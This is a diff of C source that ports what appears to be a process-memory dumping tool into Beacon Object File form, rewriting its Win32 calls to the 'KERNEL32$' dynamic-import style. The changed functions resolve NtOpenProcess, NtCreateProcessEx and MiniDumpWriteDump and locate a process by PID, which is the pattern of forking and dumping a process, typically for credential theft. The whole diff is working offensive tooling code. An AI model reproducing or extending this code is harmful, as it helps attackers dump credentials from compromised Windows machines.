@@ -18,8 +18,10 @@ DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle();
 DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameW();
 DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW();
 DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges();
-
-
+DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress();
+DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW();
+DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW();
+DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$CreateToolhelp32Snapshot();
 
 
 // Define STATUS_SUCCESS if not already defined
@@ -253,13 +255,13 @@ BOOL EnablePrivilege()
 
 // Load NtOpenProcess function from ntdll.dll
 BOOL LoadNtOpenProcess() {
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
     if (hNtdll == NULL) {
         printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", KERNEL32$GetLastError());
         return FALSE;
     }
 
-    pNtOpenProcess = (PNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
+    pNtOpenProcess = (PNtOpenProcess)KERNEL32$GetProcAddress(hNtdll, "NtOpenProcess");
     if (pNtOpenProcess == NULL) {
         printf("\t[!] Failed to get address of NtOpenProcess! Error: %lu\n", KERNEL32$GetLastError());
         return FALSE;
@@ -270,15 +272,15 @@ BOOL LoadNtOpenProcess() {
 
 // Load NtCreateProcessEx from ntdll.dll
 BOOL LoadNtCreateProcessEx() {
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
     if (hNtdll == NULL) {
-        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", GetLastError());
+        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", KERNEL32$GetLastError());
         return FALSE;
     }
 
-    pNtCreateProcessEx = (PNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
+    pNtCreateProcessEx = (PNtCreateProcessEx)KERNEL32$GetProcAddress(hNtdll, "NtCreateProcessEx");
     if (pNtCreateProcessEx == NULL) {
-        printf("\t[!] Failed to get address of NtCreateProcessEx! Error: %lu\n", GetLastError());
+        printf("\t[!] Failed to get address of NtCreateProcessEx! Error: %lu\n", KERNEL32$GetLastError());
         return FALSE;
     }
     printf("\t[i] Successfully loaded NtCreateProcessEx from ntdll.dll\n");
@@ -287,15 +289,15 @@ BOOL LoadNtCreateProcessEx() {
 
 // Load MiniDumpWriteDump from Dbghelp.dll
 BOOL LoadMiniDumpWriteDump() {
-    HMODULE hDbgHelp = LoadLibraryW(L"Dbghelp.dll");
+    HMODULE hDbgHelp = KERNEL32$LoadLibraryW(L"Dbghelp.dll");
     if (hDbgHelp == NULL) {
-        printf("\t[!] Failed to load Dbghelp.dll! Error: %lu\n", GetLastError());
+        printf("\t[!] Failed to load Dbghelp.dll! Error: %lu\n", KERNEL32$GetLastError());
         return FALSE;
     }
 
-    pMiniDumpWriteDump = (PMiniDumpWriteDump)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+    pMiniDumpWriteDump = (PMiniDumpWriteDump)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
     if (pMiniDumpWriteDump == NULL) {
-        printf("\t[!] Failed to get address of MiniDumpWriteDump! Error: %lu\n", GetLastError());
+        printf("\t[!] Failed to get address of MiniDumpWriteDump! Error: %lu\n", KERNEL32$GetLastError());
         return FALSE;
     }
     printf("\t[i] Successfully loaded MiniDumpWriteDump from Dbghelp.dll\n");
@@ -304,9 +306,9 @@ BOOL LoadMiniDumpWriteDump() {
 
 // Find Process Function
 DWORD FindProcess(DWORD pid) {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
-        printf("\t [!] Failed to create snapshot! Error Code: %u\n", GetLastError());
+        printf("\t [!] Failed to create snapshot! Error Code: %u\n", KERNEL32$GetLastError());
         return 0;
     }
 
@@ -322,7 +324,7 @@ DWORD FindProcess(DWORD pid) {
         } while (Process32Next(snapshot, &pe32));
     }
 
-    CloseHandle(snapshot);
+    KERNEL32$CloseHandle(snapshot);
     return foundPid;
 }
 
